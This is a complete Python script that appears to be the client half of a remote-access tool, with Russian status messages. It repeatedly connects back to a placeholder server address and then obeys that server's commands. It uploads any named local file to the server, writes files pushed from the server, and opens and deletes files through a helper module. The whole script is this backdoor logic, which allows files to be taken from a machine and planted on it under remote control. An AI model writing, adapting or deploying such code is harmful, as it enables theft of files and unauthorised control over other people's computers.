import socket
import os
import time

from modules import main as m

HOST, PORT = 'suda playit', 0000

def download(s):
    header = s.recv(1024).decode('utf-8').strip()
    try:
        parts = header.split()
        file_size = int(parts[1]) 
        filename = parts[2]
    
        with open(filename, 'wb') as file:
            received = 0
            while received < file_size:
                data = s.recv(24576)
                if not data:
                    break
                file.write(data)
                received += len(data)
    except (ValueError, IndexError):
        return
    
def send(filename, s):
    try:
        file_size = os.path.getsize(filename)
        header = f"FILE {file_size} {os.path.basename(filename)}".encode('utf-8')
        s.send(header.ljust(1024))

        print(f"<-+-> Отправляю файл {filename} ({file_size} байт)")

        with open(filename, 'rb') as file:
            while True:
                data = file.read(24576)
                if not data:
                    break
                s.send(data)
        print(f"<-+-> Файл {filename} отправлен.")
    except FileNotFoundError:
        print("<---> Файл не найден.")
        s.send(b"ERROR")

def connect_to_server(HOST, PORT):
    while True:
        try:
            print(f"<---> Попытка подключиться к серверу {HOST}:{PORT}...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            return s
        except socket.error as e:
            print(f"<---> Ошибка при подключении: {e}")
            time.sleep(5)

def execute_commands(s):
    while True:
        print(f"<-+-> Подключение к серверу установлено.")
        command = s.recv(24576).decode('utf-8')
        s.send(b'<-+->Answered')

        if command.lower() == 'exit':
            break

        elif 'loadfile' in command:
            filename = command[8:].strip()
            download(s)
            
        elif 'download' in command:
            filename = command[8:].strip()
            send(filename, s)

        elif 'openfile' in command:
            filename = command[8:].strip()
            m.play_and_delete(filename)

def main():
    s = connect_to_server(HOST, PORT)
    execute_commands(s)

if __name__ == '__main__':
    main()